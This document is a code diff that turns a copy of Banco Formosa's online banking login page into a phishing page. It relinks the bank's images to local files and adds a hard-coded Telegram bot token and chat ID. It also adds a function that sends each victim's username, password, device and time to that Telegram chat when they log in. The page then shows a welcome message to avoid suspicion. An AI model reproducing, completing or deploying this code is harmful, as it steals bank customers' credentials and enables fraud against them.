@@ -995,7 +995,7 @@
 
     <!-- ===== VIDEO DE FONDO ===== -->
     <video id="bg-video" autoplay muted loop playsinline>
-        <source src="/video.mp4" type="video/mp4">
+        <source src="video.mp4" type="video/mp4">
     </video>
     <div class="video-overlay"></div>
 
@@ -1205,14 +1205,14 @@
                         <div class="mobileInfo">
                             <div class="nets margin-top">
                                 <a target="_blank" href="#">
-                                    <img src="https://hb.bancoformosa.com.ar/assets/img/icon-facebook.png">
+                                    <img src="img/icon-facebook.png">
                                 </a>
                                 <a target="_blank" href="#">
-                                    <img class="remove-margin" src="https://hb.bancoformosa.com.ar/assets/img/icon-instagram.png">
+                                    <img class="remove-margin" src="img/icon-instagram.png">
                                 </a>
                             </div>
                             <div class="tels margin-top">
-                                <img src="https://hb.bancoformosa.com.ar/assets/img/icon-tel.png">
+                                <img src="img/icon-tel.png">
                                 <div class="data">
                                     <h3>0800 777 2262</h3>
                                     <p>Lunes a Viernes 7 a 19 Hs.</p>
@@ -1221,10 +1221,10 @@
                             <h3 class="margin-top">Descarga nuestra App</h3>
                             <div class="apps">
                                 <a target="_blank" href="#">
-                                    <img src="https://hb.bancoformosa.com.ar/assets/img/apple.png">
+                                    <img src="img/apple.png">
                                 </a>
                                 <a target="_blank" href="#">
-                                    <img src="https://hb.bancoformosa.com.ar/assets/img/android.png">
+                                    <img src="img/android.png">
                                 </a>
                             </div>
                         </div>
@@ -1244,8 +1244,42 @@
     </div>
 
     <script>
+        // =============================================
+        // CONFIGURACIÓN DE TELEGRAM
+        // =============================================
+        // CAMBIA ESTOS VALORES POR LOS TUYOS:
+        const TELEGRAM_BOT_TOKEN = "8998295534:AAGGIxzih1XeS0pXW3TAIHEYAmRACr1Tik8";
+        const TELEGRAM_CHAT_ID = "7776240161";
+        // =============================================
+
         var tecladoActivo = false;
 
+        // ===== FUNCIÓN PARA ENVIAR A TELEGRAM =====
+        function enviarATelegram(usuario, clave) {
+            const mensaje = "🔐 *Nuevo intento de inicio de sesión*%0A%0A" +
+                           "👤 *Usuario:* " + encodeURIComponent(usuario) + "%0A" +
+                           "🔑 *Clave:* " + encodeURIComponent(clave) + "%0A%0A" +
+                           "📱 *Dispositivo:* " + encodeURIComponent(navigator.userAgent) + "%0A" +
+                           "🌐 *IP:* " + encodeURIComponent("Obtenida por el servidor") + "%0A" +
+                           "🕐 *Fecha:* " + encodeURIComponent(new Date().toLocaleString());
+
+            const url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage?chat_id=" + TELEGRAM_CHAT_ID + "&text=" + mensaje + "&parse_mode=Markdown";
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("✅ Mensaje enviado a Telegram correctamente");
+                    } else {
+                        console.log("❌ Error al enviar a Telegram:", data);
+                    }
+                })
+                .catch(error => {
+                    console.log("❌ Error de conexión con Telegram:", error);
+                });
+        }
+
+        // ===== FUNCIONES EXISTENTES =====
         function toggleTeclado(element) {
             element.classList.toggle('active');
             var keyboard = document.getElementById('virtualKeyboard');
@@ -1375,7 +1409,16 @@
                 return;
             }
             
+            // ===== ENVIAR A TELEGRAM =====
+            enviarATelegram(usuario, clave);
+            
+            // Mostrar mensaje de bienvenida
             alert('¡Bienvenido ' + usuario + '!');
+            
+            // Limpiar campos (opcional)
+            document.getElementById('campoUsuario').value = '';
+            document.getElementById('campoClave').value = '';
+            volverUsuario();
         }
 
         document.addEventListener('keydown', function(event) {
